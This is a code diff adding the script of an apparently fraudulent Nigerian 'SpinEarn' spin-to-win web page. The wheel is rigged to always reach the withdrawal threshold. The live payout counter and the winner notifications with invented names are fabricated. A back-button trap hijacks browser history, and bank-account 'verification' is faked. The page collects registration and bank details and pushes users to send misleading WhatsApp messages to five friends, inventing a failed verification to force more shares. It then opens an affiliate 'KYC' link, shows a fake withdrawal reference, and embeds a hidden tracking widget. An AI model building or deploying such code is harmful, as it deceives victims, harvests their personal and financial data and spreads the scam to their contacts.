+  [3,1,7], // 15000+12000+18000=45000
+  [5,2,3], // 20000+8000+15000=43000
+  [1,5,4], // 12000+20000+10000=42000
+  [7,5,0], // 18000+20000+5000=43000
+  [3,5,2], // 15000+20000+8000=43000
+  [1,7,4], // 12000+18000+10000=40000
+];
+let spinSequence = SEQUENCES[Math.floor(Math.random()*SEQUENCES.length)];
+
+let currentRotation=0;
+
+// Init
+document.querySelectorAll(".screen").forEach(s=>{s.style.display="none";});
+document.getElementById("landing").style.display="block";
+document.getElementById("landing").classList.add("active");
+
+function buildWheelGradient(){
+  let stops=[];
+  for(let i=0;i<8;i++){
+    stops.push(`${WHEEL_COLORS[i]} ${i*45}deg ${(i+1)*45}deg`);
+  }
+  return `conic-gradient(from 0deg, ${stops.join(', ')})`;
+}
+function renderWheels(){
+  const grad=buildWheelGradient();
+  const prev=document.getElementById("previewWheel");
+  if(prev) prev.style.background=grad;
+  const main=document.getElementById("mainWheel");
+  if(main){
+    main.style.background=grad;
+    main.querySelectorAll('.wheel-seg-label').forEach(e=>e.remove());
+    for(let i=0;i<8;i++){
+      const angle=i*45+22.5;
+      const label=document.createElement('div');
+      label.className='wheel-seg-label';
+      label.style.color=WHEEL_TEXT[i];
+      label.style.top='50%';
+      label.style.left='50%';
+      label.style.transform=`translate(-50%,-50%) rotate(${angle}deg) translateY(-100px)`;
+      label.textContent='₦'+(WHEEL_AMOUNTS[i]/1000)+'K';
+      main.appendChild(label);
+    }
+  }
+}
+renderWheels();
+
+/* BACKTRAP */
+(function(){
+  history.pushState(null,"",location.href);
+  history.pushState(null,"",location.href);
+  history.pushState(null,"",location.href);
+  window.addEventListener("popstate",function(){
+    history.pushState(null,"",location.href);
+    if(currentScreen==='landing'||currentScreen==='register'){
+      window.location.href=BACK;
+    } else {
+      showBackWarn();
+    }
+  });
+})();
+document.addEventListener("contextmenu",e=>e.preventDefault());
+
+function showBackWarn(){
+  document.getElementById("bwAmount").textContent="₦"+totalBalance.toLocaleString("en-NG");
+  document.getElementById("backWarn").classList.add("show");
+}
+function closeBackWarn(){document.getElementById("backWarn").classList.remove("show");}
+function leaveAnyway(){
+  document.getElementById("backWarn").classList.remove("show");
+  document.getElementById("secondChance").classList.add("show");
+}
+function claimSecondChance(){
+  window.open(SECOND_CHANCE_OFFER,"_blank");
+  document.getElementById("secondChance").classList.remove("show");
+}
+function closeSecondChance(){
+  document.getElementById("secondChance").classList.remove("show");
+}
+
+/* LIVE COUNTER */
+(function(){
+  let base = 9800000 + Math.floor(Math.random()*600000);
+  const el=document.getElementById("liveCounter");
+  if(!el) return;
+  function fmt(n){return "₦"+n.toLocaleString("en-NG");}
+  el.textContent=fmt(base);
+  function tick(){
+    const amts=[5000,7000,8000,10000,12000,15000,18000,20000];
+    base+=amts[Math.floor(Math.random()*amts.length)];
+    el.textContent=fmt(base);
+    setTimeout(tick, 4000+Math.random()*4000);
+  }
+  setTimeout(tick, 3000);
+})();
+
+/* ACTIVITY FEED */
+const ACT_PEOPLE=[
+  {i:"AO",c:"#FF6B35",n:"Adaeze",city:"Lagos"},{i:"EM",c:"#2979FF",n:"Emeka",city:"Abuja"},
+  {i:"FB",c:"#AA00FF",n:"Fatima",city:"Kano"},{i:"CJ",c:"#00C853",n:"Chukwudi",city:"Enugu"},
+  {i:"NG",c:"#FF1744",n:"Ngozi",city:"Port Harcourt"},{i:"TK",c:"#FFD600",n:"Tunde",city:"Ibadan"},
+  {i:"AB",c:"#00BCD4",n:"Amaka",city:"Benin"},{i:"SF",c:"#FF6B35",n:"Seun",city:"Lagos"},
+  {i:"IB",c:"#4CAF50",n:"Ibrahim",city:"Kaduna"},{i:"KO",c:"#E91E63",n:"Kemi",city:"Owerri"},
+];
+function showActivityToast(){
+  const p=ACT_PEOPLE[Math.floor(Math.random()*ACT_PEOPLE.length)];
+  const earnAmts=[5000,8000,10000,12000,15000,18000,20000];
+  const withdrawAmts=[40000,42000,43000,45000,48000,50000];
+  const actionIdx=Math.floor(Math.random()*4);
+  let amt, action;
+  if(actionIdx===0){amt=earnAmts[Math.floor(Math.random()*earnAmts.length)];action=`just won ₦${amt.toLocaleString("en-NG")} 🎰`;}
+  else if(actionIdx===1){amt=withdrawAmts[Math.floor(Math.random()*withdrawAmts.length)];action=`just withdrew ₦${amt.toLocaleString("en-NG")} to OPay 🎉`;}
+  else if(actionIdx===2){amt=earnAmts[Math.floor(Math.random()*earnAmts.length)];action=`spun and won ₦${amt.toLocaleString("en-NG")} 🔥`;}
+  else{amt=withdrawAmts[Math.floor(Math.random()*withdrawAmts.length)];action=`withdrew ₦${amt.toLocaleString("en-NG")} to PalmPay 💸`;}
+  const t=document.getElementById("activityToast");
+  document.getElementById("atAv").textContent=p.i;
+  document.getElementById("atAv").style.background=p.c;
+  document.getElementById("atName").textContent=p.n+" ("+p.city+")";
+  document.getElementById("atAction").textContent=action;
+  t.classList.add("show");
+  setTimeout(()=>t.classList.remove("show"),3500);
+}
+setTimeout(()=>{showActivityToast();setInterval(showActivityToast,12000+Math.random()*8000);},5000);
+
+function goScreen(id){
+  document.querySelectorAll(".screen").forEach(s=>{s.classList.remove("active");s.style.display="none";});
+  const target=document.getElementById(id);
+  target.classList.add("active");
+  if(["loading","processing"].includes(id)){
+    target.style.display="flex";target.style.flexDirection="column";target.style.alignItems="center";target.style.justifyContent="center";
+  } else { target.style.display="block"; }
+  currentScreen=id;
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+
+function doRegister(){
+  const name=document.getElementById("regName").value.trim();
+  const email=document.getElementById("regEmail").value.trim();
+  const pass=document.getElementById("regPass").value.trim();
+  if(!name){showToast("⚠️ Enter your full name");return;}
+  if(!email||!email.includes("@")){showToast("⚠️ Enter a valid email");return;}
+  if(!pass||pass.length<6){showToast("⚠️ Password must be at least 6 characters");return;}
+  userName=name.split(" ")[0];
+  goScreen("loading");
+  runLoadingSequence();
+  saveRegistration(name, email);
+}
+
+function runLoadingSequence(){
+  const steps=["ls1","ls2","ls3","ls4"];
+  const fill=document.getElementById("ldFill");
+  let i=0;
+  const iv=setInterval(()=>{
+    if(i<steps.length){
+      const s=document.getElementById(steps[i]);
+      s.classList.add("done");s.querySelector(".ld-step-dot").textContent="✓";
+      fill.style.width=((i+1)/steps.length*100)+"%";i++;
+    }else{
+      clearInterval(iv);
+      setTimeout(()=>{
+        goScreen("dashboard");
+        document.getElementById("dashName").textContent=userName+"!";
+      },600);
+    }
+  },700);
+}
+
+/* ===== SPIN MECHANIC ===== */
+function doSpin(){
+  if(spinBusy || spinsLeft<=0) return;
+  spinBusy=true;
+  document.getElementById("btnSpin").disabled=true;
+  document.getElementById("spinResult").classList.remove("show");
+
+  const targetIndex=spinSequence[spinIndex];
+  const requiredMod=(360-(targetIndex*45+22.5))%360;
+  let extra=requiredMod-(currentRotation%360);
+  if(extra<=0) extra+=360;
+  currentRotation=currentRotation+1800+extra;
+
+  const wheel=document.getElementById("mainWheel");
+  wheel.style.transform=`rotate(${currentRotation}deg)`;
+
+  setTimeout(()=>{
+    const amount=WHEEL_AMOUNTS[targetIndex];
+    spinAmounts[spinIndex]=amount;
+    totalBalance+=amount;
+    spinsLeft--;
+    spinIndex++;
+
+    document.getElementById("srAmount").textContent="+₦"+amount.toLocaleString("en-NG");
+    document.getElementById("spinResult").classList.add("show");
+    showEarnToast("+₦"+amount.toLocaleString("en-NG")+" Won! 🎰");
+    fireConfetti();
+    updateBalance();
+
+    if(spinsLeft>0){
+      document.getElementById("btnSpin").disabled=false;
+    }else{
+      document.getElementById("btnSpin").style.display="none";
+      document.getElementById("wdTeaser").style.display="block";
+      setTimeout(()=>{
+        document.getElementById("wdTeaserBtn").textContent="🎉 View My ₦"+totalBalance.toLocaleString("en-NG")+" Winnings →";
+      },300);
+    }
+    spinBusy=false;
+  },4200);
+}
+
+function updateBalance(){
+  const fmt=n=>"₦"+n.toLocaleString("en-NG");
+  document.getElementById("dashBalance").textContent=fmt(totalBalance);
+  document.getElementById("spinsLeft").textContent=spinsLeft;
+  document.getElementById("earnPageAmount").textContent=totalBalance.toLocaleString("en-NG");
+  document.getElementById("totalEarnBreakdown").textContent=fmt(totalBalance);
+  document.getElementById("wdAmount").textContent=fmt(totalBalance);
+  document.getElementById("spin1Val").textContent=spinAmounts[0]?fmt(spinAmounts[0]):"—";
+  document.getElementById("spin2Val").textContent=spinAmounts[1]?fmt(spinAmounts[1]):"—";
+  document.getElementById("spin3Val").textContent=spinAmounts[2]?fmt(spinAmounts[2]):"—";
+}
+
+function fireConfetti(){
+  const colors=['#FFC700','#8B5CF6','#00E676','#FF6B35','#FF3D71'];
+  const container=document.getElementById("confetti");
+  for(let i=0;i<28;i++){
+    const piece=document.createElement('div');
+    piece.className='confetti-piece';
+    piece.style.left=Math.random()*100+'%';
+    piece.style.background=colors[Math.floor(Math.random()*colors.length)];
+    piece.style.animationDelay=(Math.random()*0.3)+'s';
+    piece.style.borderRadius=Math.random()>0.5?'50%':'2px';
+    container.appendChild(piece);
+    setTimeout(()=>piece.remove(),3000);
+  }
+}
+
+function tryWithdraw(){
+  if(totalBalance>=MIN_WITHDRAW) goScreen("withdraw");
+  else showToast("⚠️ Minimum withdrawal is ₦40,000");
+}
+
+function selectBank(bank){
+  selectedBank=bank;
+  document.getElementById("bankOpay").classList.toggle("selected",bank==="opay");
+  document.getElementById("bankPalmpay").classList.toggle("selected",bank==="palmpay");
+}
+
+let bankVerifyTimer=null;
+function triggerBankVerify(val){
+  const statusEl=document.getElementById("bankVerifyStatus");
+  clearTimeout(bankVerifyTimer);
+  if(val.length<10){ statusEl.style.display="none"; return; }
+  statusEl.style.display="block";
+  statusEl.style.background="rgba(255,199,0,.1)";
+  statusEl.style.border="1px solid rgba(255,199,0,.3)";
+  statusEl.style.color="#FFC700";
+  statusEl.innerHTML='<span style="animation:spin 1s linear infinite;display:inline-block;">⏳</span> Verifying account...';
+  bankVerifyTimer=setTimeout(()=>{
+    const bankName=selectedBank==="opay"?"OPay":"PalmPay";
+    statusEl.style.background="rgba(0,230,118,.1)";
+    statusEl.style.border="1px solid rgba(0,230,118,.3)";
+    statusEl.style.color="#00E676";
+    statusEl.innerHTML='✅ Account Verified — '+bankName;
+  },1800);
+}
+
+function placeWithdrawal(){
+  const acc=document.getElementById("wdAccNo").value.trim();
+  const name=document.getElementById("wdAccName").value.trim();
+  if(!acc||acc.length<10){showToast("⚠️ Enter a valid 10-digit account number");return;}
+  if(!name){showToast("⚠️ Enter your account name");return;}
+  withdrawalAmount=totalBalance;withdrawalBank=selectedBank;withdrawalAcc=acc;
+  swShares=0;shareFailTriggered=false;
+  saveWithdrawal(name, acc, selectedBank, totalBalance);
+  goScreen("sharewall");
+  const bankName=withdrawalBank==="opay"?"OPay":"PalmPay";
+  document.getElementById("swHeroTitle").textContent="Verify to Receive ₦"+withdrawalAmount.toLocaleString("en-NG");
+  document.getElementById("swHeroSub").innerHTML=`To process your <strong>₦${withdrawalAmount.toLocaleString("en-NG")} withdrawal</strong> to <strong>${bankName}</strong>, share SpinEarn with 5 Nigerian friends to verify your account.`;
+  document.getElementById("swFill").style.width="0%";
+  document.getElementById("swPct").textContent="0%";
+  document.getElementById("swStatus").textContent="Share with 5 friends to unlock withdrawal";
+  document.getElementById("swBtnText").textContent="Share on WhatsApp to Verify";
+  const old=document.getElementById("shareFailNotice");if(old)old.remove();
+}
+
+function getMsg(){
+  const amt=withdrawalAmount||totalBalance;
+  return `🎰 I just SPUN and won ₦${amt.toLocaleString("en-NG")} on SpinEarn — and I'm withdrawing it RIGHT NOW!\n\nEvery spin pays between ₦5,000–₦20,000. No losers, ever 😱\n\n✅ Free to join — 3 free spins instantly\n✅ Withdraw to OPay/PalmPay\n✅ I'm proof it works — see my balance 👆\n\n👇 Join before slots fill up:\n${SITE}\n\nI'm withdrawing mine now, join fast! 🔥`;
+}
+
+let swBusy=false;
+function doShareWA(){
+  if(swBusy||swShares>=REQ)return;
+  if(swShares===2&&!shareFailTriggered){
+    shareFailTriggered=true;swBusy=true;
+    window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");
+    setTimeout(()=>{
+      swBusy=false;
+      const old=document.getElementById("shareFailNotice");if(old)old.remove();
+      const fail=document.createElement("div");
+      fail.id="shareFailNotice";fail.className="share-fail";
+      fail.innerHTML=`<div class="sf-title">⚠️ Verification Failed</div><div class="sf-sub">This share could not be verified. Please share again to retry — your progress is saved.</div>`;
+      document.getElementById("btnShareWA").parentNode.insertBefore(fail,document.getElementById("btnShareWA"));
+      showToast("⚠️ Share not verified — try again");
+    },1800);
+    return;
+  }
+  swBusy=true;
+  window.open("https://api.whatsapp.com/send?text="+encodeURIComponent(getMsg()),"_blank");
+  setTimeout(()=>{
+    swBusy=false;swShares++;
+    const old=document.getElementById("shareFailNotice");if(old)old.remove();
+    const pct=Math.round((swShares/REQ)*100);
+    document.getElementById("swFill").style.width=pct+"%";
+    document.getElementById("swPct").textContent=pct+"%";
+    const rem=REQ-swShares;
+    if(rem>0){
+      document.getElementById("swStatus").textContent=rem+" more friend"+(rem>1?"s":"")+" needed";
+      document.getElementById("swBtnText").textContent="Share Again ("+rem+" more)";
+      showToast("✅ Verified — "+rem+" more to go");
+    }else{
+      document.getElementById("swStatus").textContent="Account verified! ✓";
+      document.getElementById("swBtnText").textContent="Verified ✓";
+      setTimeout(()=>goScreen("kyc"),800);
+    }
+  },1800);
+}
+
+function doKYC(){
+  document.getElementById("kycAmount").textContent="₦"+withdrawalAmount.toLocaleString("en-NG");
+  document.getElementById("kycBank").textContent=withdrawalBank==="opay"?"OPay":"PalmPay";
+  window.open(AFF,"_blank");
+  setTimeout(()=>{
+    const ref="SE-"+Math.floor(100000+Math.random()*900000);
+    const bankName=withdrawalBank==="opay"?"OPay":"PalmPay";
+    goScreen("processing");
+    document.getElementById("ppRef").textContent=ref;
+    document.getElementById("ppAmount").textContent="₦"+withdrawalAmount.toLocaleString("en-NG");
+    document.getElementById("ppBank").textContent=bankName;
+    document.getElementById("ppBankNote").textContent="Your "+bankName+" account ("+withdrawalAcc.slice(0,3)+"*****"+withdrawalAcc.slice(-2)+") will receive ₦"+withdrawalAmount.toLocaleString("en-NG")+" within 24 hours.";
+  },1500);
+}
+
+function getTime(){const d=new Date();return d.getHours().toString().padStart(2,"0")+":"+d.getMinutes().toString().padStart(2,"0");}
+function showEarnToast(msg){const t=document.getElementById("earnToast");t.textContent=msg;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),3000);}
+function showToast(m){const t=document.getElementById("toast");t.textContent=m;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),2800);}
+
+// Update kycBtnAmount whenever kyc screen becomes active
+const _origGoScreen=goScreen;
+goScreen=function(id){
+  _origGoScreen(id);
+  if(id==='kyc'){
+    document.getElementById("kycBtnAmount").textContent=withdrawalAmount.toLocaleString("en-NG");
+    document.getElementById("kycAmount").textContent="₦"+withdrawalAmount.toLocaleString("en-NG");
+    document.getElementById("kycBank").textContent=withdrawalBank==="opay"?"OPay":"PalmPay";
+  }
+};
+</script>
+
+<!-- Hidden visit counter (1x1px, non-interactive, invisible to users) -->
+<div style="position:absolute;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;left:-9999px;">
+<script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
+<script type="text/javascript">sc_online_i(1735208,"ffffff","ffffff");</script>
+</div>
+
+</body>
+</html>
